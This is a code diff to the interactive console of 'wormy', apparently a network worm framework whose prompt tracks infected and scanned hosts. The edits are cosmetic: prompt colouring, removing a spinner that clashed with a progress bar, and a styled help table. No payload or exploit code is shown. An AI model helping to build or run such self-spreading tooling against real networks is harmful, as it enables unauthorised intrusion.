@@ -14,10 +14,11 @@ import tempfile
 import time
 from datetime import datetime
 
+from colorama import Fore, Style
 from rich.console import Console
-from rich.markup import escape
 from rich.panel import Panel
 from rich.table import Table
+from rich.text import Text
 
 from utils.logger import logger
 
@@ -83,10 +84,25 @@ class InteractiveCLI(cmd.Cmd):
     def _update_prompt(self):
         infected = len(self.worm.infected_hosts) if hasattr(self.worm, "infected_hosts") else 0
         scanned = len(self.worm.scan_results) if hasattr(self.worm, "scan_results") else 0
-        status = (
-            "[bold green]● RUNNING[/]" if getattr(self.worm, "running", False) else "[dim]○ IDLE[/]"
-        )
-        self.prompt = f"\n{status}  [bold cyan]wormy[/][dim]::{infected} infected[/][dim]::{scanned} hosts[/]\n> "
+        running = bool(getattr(self.worm, "running", False))
+        # cmd.Cmd writes the prompt through input()/stdout directly, so it
+        # must be a plain string: rich markup would show up literally as
+        # "[dim]○ IDLE[/]...". ANSI escapes (colorama) give the same look.
+        if console.is_terminal:
+            status = (
+                f"{Fore.GREEN}{Style.BRIGHT}● RUNNING{Style.RESET_ALL}"
+                if running
+                else f"{Style.DIM}○ IDLE{Style.RESET_ALL}"
+            )
+            head = (
+                f"{status}  {Fore.CYAN}{Style.BRIGHT}wormy{Style.RESET_ALL}"
+                f"{Style.DIM}::{infected} infected{Style.RESET_ALL}"
+                f"{Style.DIM}::{scanned} hosts{Style.RESET_ALL}"
+            )
+        else:
+            status = "● RUNNING" if running else "○ IDLE"
+            head = f"{status}  wormy::{infected} infected::{scanned} hosts"
+        self.prompt = f"\n{head}\n> "
 
     def _uptime(self) -> str:
         elapsed = time.time() - self._start_time
@@ -136,8 +152,10 @@ class InteractiveCLI(cmd.Cmd):
     def do_scan(self, arg):
         """Scan the network. Usage: scan [professional|basic]"""
         use_pro = "basic" not in arg.lower()
-        with console.status("[bold cyan]Scanning network...", spinner="dots"):
-            results = self.worm.scan_network(use_professional=use_pro)
+        # No console.status here: its live spinner fights with the scanner's
+        # own single-line progress bar (cursor rewrites broke line updates).
+        console.print("[bold cyan]Scanning network...[/]")
+        results = self.worm.scan_network(use_professional=use_pro)
 
         if not results:
             console.print("[dim]No hosts discovered.[/]")
@@ -600,8 +618,10 @@ class InteractiveCLI(cmd.Cmd):
             self.worm.knowledge_graph.add_host(local_ip, is_infected=True)
             self.worm.knowledge_graph.mark_infected(local_ip, "origin")
 
-        with console.status("[bold cyan]Scanning...", spinner="dots"):
-            self.worm.scan_network()
+        # Plain header instead of console.status: the spinner's cursor
+        # rewrites conflict with the scanner's single-line progress bar.
+        console.print("[bold cyan]Scanning...[/]")
+        self.worm.scan_network()
 
         iteration = 0
         online_learning_interval = 10
@@ -615,8 +635,8 @@ class InteractiveCLI(cmd.Cmd):
             console.print(f"\n[bold cyan]━ Iteration {iteration} ━[/]")
 
             if iteration % 5 == 0:
-                with console.status("[dim]Rescanning...", spinner="dots"):
-                    self.worm.scan_network()
+                console.print("[dim]Rescanning...[/]")
+                self.worm.scan_network()
 
             if self.worm.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
                 self.worm._run_adaptive_cycle(iteration)
@@ -862,11 +882,25 @@ class InteractiveCLI(cmd.Cmd):
 
     # ── HELP / EXIT ──────────────────────────────────────────────────
 
+    @staticmethod
+    def _command_cell(spec: str) -> Text:
+        """Render a command spec as a two-tone cell: the command word in
+        bold cyan, its usage hints ([...] / <...>) dim italic.
+
+        A Text object carries explicit styles, so the bracketed hints do
+        not need markup escaping.
+        """
+        parts = spec.split(" ", 1)
+        cell = Text(parts[0], style="bold cyan")
+        if len(parts) > 1:
+            cell.append(" " + parts[1], style="dim italic")
+        return cell
+
     def do_help(self, arg):
         """Show help"""
         t = Table(border_style="bright_blue", title="[bold]Commands[/]")
-        t.add_column("Command", style="cyan")
-        t.add_column("Description")
+        t.add_column("Command")
+        t.add_column("Description", style="white")
         commands = [
             ("scan [pro|basic]", "Scan network for hosts"),
             ("targets", "List discovered targets"),
@@ -893,9 +927,7 @@ class InteractiveCLI(cmd.Cmd):
             ("exit", "Exit CLI"),
         ]
         for cmd_name, desc in commands:
-            # escape(): the command column contains "[...]" usage hints that
-            # rich would otherwise swallow as markup style tags.
-            t.add_row(escape(cmd_name), desc)
+            t.add_row(self._command_cell(cmd_name), desc)
         console.print(t)
 
     def do_version(self, arg):
@@ -905,6 +937,8 @@ class InteractiveCLI(cmd.Cmd):
     def do_exit(self, arg):
         """Exit the CLI"""
         console.print("[yellow]Exiting...[/]")
+        # shutdown() is idempotent — the engine wrapper (cmd_shell) calls it
+        # again in its finally block, which must not duplicate the report.
         self.worm.shutdown()
         return True
 
